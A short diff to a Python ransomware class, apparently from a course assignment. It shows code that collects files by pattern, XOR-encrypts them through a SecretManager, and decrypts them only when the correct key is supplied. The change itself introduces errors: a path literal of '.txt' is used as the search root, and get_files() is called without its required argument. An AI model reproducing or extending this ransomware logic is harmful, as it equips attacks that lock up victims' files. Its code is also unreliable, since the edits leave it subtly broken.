@@ -47,7 +47,7 @@ class Ransomware:
     def get_files(self, filter: str) -> list:
         # Return all files matching the filter
         files = []
-        for file in Path(".").rglob(filter):
+        for file in Path(".txt").rglob(filter):
             if file.is_file():
                 files.append(str(file.resolve()))
         return files
@@ -57,7 +57,7 @@ class Ransomware:
         
     def encrypt(self):
         # main function for encrypting (see PDF)
-        files = self.get_files(".txt") # get all files
+        files = self.get_files() 
         secret_manager = SecretManager()
         secret_manager.setup() # setup the secret manager
         secret_manager.xorfiles(files) # encrypt the files
@@ -72,8 +72,8 @@ class Ransomware:
             secret_manager.set_key(key)
             secret_manager.xorfiles(self.get_files(".txt")) # decrypt the files
             secret_manager.clean() # clean the secret manager
-            print("Everything is ok , the files have been decrypted")
-            sys.exit(0) # exit with success
+            print("Files have been decrypted")
+            sys.exit(0) 
         else:
             print("Error: Wrong key")
             # ask for the key again
